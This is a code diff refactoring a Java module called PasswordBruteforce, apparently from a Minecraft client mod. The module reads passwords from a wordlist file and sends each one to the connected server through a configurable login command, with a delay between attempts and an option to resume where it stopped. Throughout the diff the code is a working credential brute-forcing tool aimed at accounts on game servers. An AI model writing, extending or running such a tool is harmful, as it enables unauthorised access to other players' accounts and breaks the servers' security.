@@ -20,7 +20,7 @@ public class PasswordBruteforce extends Module {
 
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
 
-    private final Setting<String> messages = sgGeneral.add(new StringSetting.Builder()
+    private final Setting<String> file = sgGeneral.add(new StringSetting.Builder()
         .name("path_to_passwordes.txt")
         .description("Messages to use for spam.")
         .defaultValue("passworws.txt")
@@ -72,50 +72,63 @@ public class PasswordBruteforce extends Module {
             return;
         }
 
-        CompletableFuture.runAsync(() -> {
-            File file = new File(messages.get());
-            if (!file.exists()) {
-                error("File with path " + messages.get() + " is not exists");
-                return;
-            }
-            if (!file.canRead()) {
-                error("No access to read file");
-                return;
-            }
-            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)))) {
-                String line;
-                int i = 0;
-                while ((line = reader.readLine()) != null) {
-                    if (!isActive())
-                        return;
-                    i++;
-                    if (last != null && last.getRight() > i) {
-                        continue;
-                    }
-                    String finalLine = line;
-                    int finalI = i;
-                    Minecraft.getInstance().execute(() -> {
-                        var connection1 = Minecraft.getInstance().getConnection();
-                        if (connection1 != null) {
-                            if (saveLast.get())
-                                last = Pair.of(finalLine, finalI);
-                            info("Password used: " + finalLine);
-                            connection1.sendCommand(MessageFormat.format(command.get(), finalLine));
-                        }
-                    });
+        CompletableFuture.runAsync(this::writePasswordFile);
+    }
 
-                    Thread.sleep(delay.get());
+    @Nullable
+    private File getPasswordFile(String fileName) {
+        File file = new File(fileName);
+        if (!file.exists()) {
+            error("File with path " + fileName + " is not exists");
+            return null;
+        }
+        if (!file.canRead()) {
+            error("No access to read file");
+            return null;
+        }
+        return file;
+    }
+
+    private void writePasswordFile() {
+        File file = getPasswordFile(this.file.get());
+
+        if (file == null) return;
+
+        try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)))) {
+            String line;
+            int i = 0;
+            while ((line = reader.readLine()) != null) {
+                if (!isActive())
+                    return;
+                i++;
+                if (last != null && last.getRight() > i) {
+                    continue;
                 }
-                toggle();
-                info("All passwords is checked");
-            } catch (FileNotFoundException e) {
-                error("File not found " + e.getMessage());
-            } catch (IOException e) {
-                error("Error of writing file " + e.getMessage());
-            } catch (InterruptedException e) {
-                error("Error of thread Interrupted " + e.getMessage());
+                String finalLine = line;
+                int finalI = i;
+                Minecraft.getInstance().execute(() -> sendPassword(finalLine, finalI));
+                Thread.sleep(delay.get());
             }
-        });
+            toggle();
+            info("All passwords is checked");
+        } catch (FileNotFoundException e) {
+            error("File not found " + e.getMessage());
+        } catch (IOException e) {
+            error("Error of writing file " + e.getMessage());
+        } catch (InterruptedException e) {
+            error("Error of thread Interrupted " + e.getMessage());
+            Thread.currentThread().interrupt();
+        }
+    }
+
+    private void sendPassword(String password, int index) {
+        var connection1 = Minecraft.getInstance().getConnection();
+        if (connection1 != null) {
+            if (saveLast.get())
+                last = Pair.of(password, index);
+            info("Password used: " + password);
+            connection1.sendCommand(MessageFormat.format(command.get(), password));
+        }
     }
 
     @EventHandler
